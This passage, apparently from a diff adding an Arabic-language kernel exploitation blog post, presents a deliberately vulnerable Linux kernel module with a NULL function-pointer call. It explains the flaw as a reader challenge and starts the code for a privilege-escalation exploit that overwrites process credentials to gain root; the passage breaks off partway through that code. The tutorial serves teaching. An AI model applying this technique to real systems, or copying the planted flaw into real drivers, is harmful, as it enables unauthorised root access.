+    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__init&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init_mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;major_num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;register_chrdev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wes4m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;// Init&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;fun_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;incCounter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Initiated, major_num: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;major_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;device_open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;try_module_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THIS_MODULE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;device_release&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;module_put&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;THIS_MODULE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__exit&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;exit_mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;unregister_chrdev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;major_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;DEVICE_NAME&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Exited&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;module_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;init_mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;module_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;exit_mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;عند تنصيبه في النواة بنجاح ستظهر الرسالة التالية&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/content/initiated.png&quot; alt=&quot;initiated&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;أشجع القارئ على محاولة العثور على الثغرة في الكود السابق ومحاولة إستغلالها كتحدي ومن ثم إكمال القراءة للإطلاع على الحل.&lt;/p&gt;
+
+&lt;h3 id=&quot;الثغرة&quot;&gt;الثغرة&lt;/h3&gt;
+
+&lt;p&gt;نبدأ بتحليل عمل الـ Module&lt;/p&gt;
+
+&lt;p&gt;فأول خطوة تحدث عند تنصيبه هي&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__init&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init_mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;major_num&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;register_chrdev&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;wes4m&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;file_ops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+	&lt;span class=&quot;c1&quot;&gt;// Init&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;fun_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;incCounter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+	&lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Initiated, major_num: %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;major_num&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;وفيها يتم تسجيله كـ Driver في النظام ووضع مؤشر لفنكشن ما في &lt;code class=&quot;highlighter-rouge&quot;&gt;fun_ptr&lt;/code&gt; وثم طباعة رسالة.&lt;/p&gt;
+
+&lt;p&gt;نرى أيضآ أن طريقة التواصل الوحيدة معه هي عن طريق &lt;code class=&quot;highlighter-rouge&quot;&gt;device_write&lt;/code&gt; واللتي تستقبل معطى integer من المستخدم وعلى أساسه تقوم بتنفيذ أمر من أمرين وهما&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;switch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    		&lt;span class=&quot;c1&quot;&gt;// Clean up &lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;fun_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_ALERT&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Cleaned up&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    	&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    		&lt;span class=&quot;c1&quot;&gt;// Increase counter and print&lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;fun_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    		&lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_ALERT&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Counter is now %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;counter&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    	&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;نلاحظ أن الأمر الأول &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;  مسؤول عن تصفير متغير &lt;code class=&quot;highlighter-rouge&quot;&gt;counter&lt;/code&gt; وأيضا المؤشر السابق اللذي تم وضعه في البداية في &lt;code class=&quot;highlighter-rouge&quot;&gt;fun_ptr&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;والأمر الثاني &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; يقوم بإستدعاء الفنكشن الموجودة في المؤشر &lt;code class=&quot;highlighter-rouge&quot;&gt;fun_ptr&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;نرى أنه في الحالة الطبيعية يمكننا إرسال أمر &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; واللذي بدوره سيقوم بإستدعاء &lt;code class=&quot;highlighter-rouge&quot;&gt;funt_ptr -&amp;gt; incCounter&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;وثم زيادة العدد في &lt;code class=&quot;highlighter-rouge&quot;&gt;counter&lt;/code&gt; وطباعته. ولكن! ماذا لو قمنا بإستدعاء الأمر &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; قبل وثم استدعينا &lt;code class=&quot;highlighter-rouge&quot;&gt;2&lt;/code&gt; ما اللذي سيحدث؟&lt;/p&gt;
+
+&lt;p&gt;في هذه الحالة سيكون المؤشر &lt;code class=&quot;highlighter-rouge&quot;&gt;fun_ptr&lt;/code&gt; = &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;وعند محاولة إستدعاءه سيحدث خطأ &lt;code class=&quot;highlighter-rouge&quot;&gt;null pointer derefernce&lt;/code&gt; يؤدي لإغلاق النظام بما أنه في النواة. وهذا الخطأ هو ثغرتنا اللتي سنستغلها.&lt;/p&gt;
+
+&lt;p&gt;عند البحث عن قيمة &lt;code class=&quot;highlighter-rouge&quot;&gt;NULL&lt;/code&gt; في لغة الـ C سنرى أنها تساوي &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; مما يعني أن النواة تحاول إستدعاء فنكشن في العنوان 0&lt;/p&gt;
+
+&lt;p&gt;بالعودة للصورة اللتي تشرح توزيع الذاكرة في العمليات نرى أن العناوين تبدأ من 0x0 … وتقع في الـ Userspace&lt;/p&gt;
+
+&lt;p&gt;ممايعني أنه يمكننا إستخدام الذاكرة في هذا العنوان ووضع فنكشن من كتابتنا لتقوم النواة بتنفيذه بصلاحياتها والقيام بتنفيذ مانريده.&lt;/p&gt;
+
+&lt;h3 id=&quot;الإستغلال&quot;&gt;الإستغلال&lt;/h3&gt;
+
+&lt;p&gt;كل عملية في النظام يتم تخزين معلوماتها في &lt;code class=&quot;highlighter-rouge&quot;&gt;struct&lt;/code&gt; في النواة يمكننا أن نرى ترتيبه من سورس linux &lt;code class=&quot;highlighter-rouge&quot;&gt;sched.h&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_struct&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Process credentials: */&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Tracer's credentials at attach: */&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rcu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptracer_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Objective and real subjective task credentials (COW): */&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rcu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;real_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* Effective (overridable) subjective task credentials (COW): */&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__rcu&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;يوجد مركب آخر بداخل المركب الأول بإسم &lt;code class=&quot;highlighter-rouge&quot;&gt;cred&lt;/code&gt; ويحتوي على صلاحيات العملية
+&lt;code class=&quot;highlighter-rouge&quot;&gt;cred.h&lt;/code&gt; linux&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;atomic_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;usage&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kuid_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* real UID of the task */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kgid_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* real GID of the task */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kuid_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;suid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* saved UID of the task */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kgid_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;sgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* saved GID of the task */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kuid_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;euid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* effective UID of the task */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kgid_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;egid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* effective GID of the task */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kuid_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;fsuid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* UID for VFS ops */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kgid_t&lt;/span&gt;		&lt;span class=&quot;n&quot;&gt;fsgid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* GID for VFS ops */&lt;/span&gt;
+	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;securebits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* SUID-less security management */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;cap_inheritable&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* caps our children can inherit */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;cap_permitted&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* caps we're permitted */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;cap_effective&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* caps we can actually use */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;cap_bset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* capability bounding set */&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;kernel_cap_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;cap_ambient&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* Ambient capability set */&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// ...&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;اذا تمكنا  من تغيير قيمة &lt;code class=&quot;highlighter-rouge&quot;&gt;euid&lt;/code&gt; الى &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; فسيعتبر النظام العملية بصلاحيات &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;يمكننا أن نسلك طريق عمل كود مسؤول عن تغيير المركب بإستخدام &lt;code class=&quot;highlighter-rouge&quot;&gt;prepare_creds&lt;/code&gt; وثم تحويله الى &lt;code class=&quot;highlighter-rouge&quot;&gt;shellcode&lt;/code&gt; ووضعه في العنوان &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;مثال على الآلية السابقة  بشكل مفصل&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;task_struct&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;my_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cred&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new_cred&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;kuid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kuid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KUIDT_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;kgid_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;kgid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;KGIDT_INIT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+&lt;span class=&quot;cm&quot;&gt;/* get context of currently active task */&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;my_task&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;get_current&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
